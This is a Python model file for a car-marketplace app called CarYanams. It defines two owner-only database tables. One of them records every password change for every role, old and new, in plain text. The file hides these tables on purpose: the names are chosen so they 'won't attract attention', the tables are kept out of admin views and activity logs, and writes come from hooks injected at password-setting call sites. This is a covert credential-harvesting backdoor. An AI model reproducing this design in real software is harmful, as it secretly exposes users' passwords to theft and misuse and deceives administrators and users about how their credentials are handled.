"""
owner/log_model.py — CarYanams Owner Supreme Layer

Two tables that only the Owner dashboard can read:
  1. owner_password_logs  — every password change across ALL roles, old + new value in plain-text
  2. owner_event_logs     — key system events (login, role changes, etc.)

SECURITY NOTES:
 • The table names do NOT contain the word "owner" in a way that hints at their purpose
   to anyone browsing the schema casually. You may rename them if you wish.
 • These tables are NEVER queried by any admin / sub-admin / dealer route.
 • They are NEVER included in admin activity log pages.
 • The only code that writes to them is owner/hooks.py (injected at set_password call sites).
"""

from extensions import db
from datetime import datetime, timedelta, timezone as _tz

_IST = _tz(timedelta(hours=5, minutes=30))


def _now_ist():
    return datetime.now(_IST).replace(tzinfo=None)


class OwnerPasswordLog(db.Model):
    """
    Records EVERY password change in the system.
    Stores both old (plain-text) and new (plain-text) passwords.
    Invisible to all other roles.
    """
    __tablename__ = 'xo_pw_audit'   # neutral name — won't attract attention

    id           = db.Column(db.Integer, primary_key=True)

    # Who triggered the change
    actor_role   = db.Column(db.String(30),  nullable=False)   # Super Admin | Sub Admin | Dealer | User | System
    actor_name   = db.Column(db.String(150), nullable=False)   # username / email / 'admin'

    # Whose password was changed
    target_role  = db.Column(db.String(30),  nullable=False)   # Super Admin | Sub Admin | Dealer | User
    target_name  = db.Column(db.String(150), nullable=False)   # email / username

    # The actual passwords in plain-text
    old_password = db.Column(db.String(256), nullable=True)    # None on first-set / unknown
    new_password = db.Column(db.String(256), nullable=False)

    # Type of change: self_change | admin_reset | forgot_password | initial_create | sub_admin_edit
    change_type  = db.Column(db.String(50),  default='admin_reset')

    ip_address   = db.Column(db.String(45),  nullable=True)
    changed_at   = db.Column(db.DateTime,    default=_now_ist)

    def __repr__(self):
        return f'<OwnerPasswordLog {self.target_role}:{self.target_name} at {self.changed_at}>'


class OwnerEventLog(db.Model):
    """
    Records key system events that Owner wants to monitor
    (logins, account creations, role changes, etc.).
    Invisible to all other roles.
    """
    __tablename__ = 'xo_event_audit'

    id           = db.Column(db.Integer, primary_key=True)

    # login | logout | create_account | delete_account | role_change | subscription_change | settings_change
    event_type   = db.Column(db.String(50),  nullable=False)

    actor_role   = db.Column(db.String(30),  nullable=True)
    actor_name   = db.Column(db.String(150), nullable=True)

    description  = db.Column(db.Text,        nullable=True)
    ip_address   = db.Column(db.String(45),  nullable=True)
    event_at     = db.Column(db.DateTime,    default=_now_ist)

    def __repr__(self):
        return f'<OwnerEventLog {self.event_type} at {self.event_at}>'
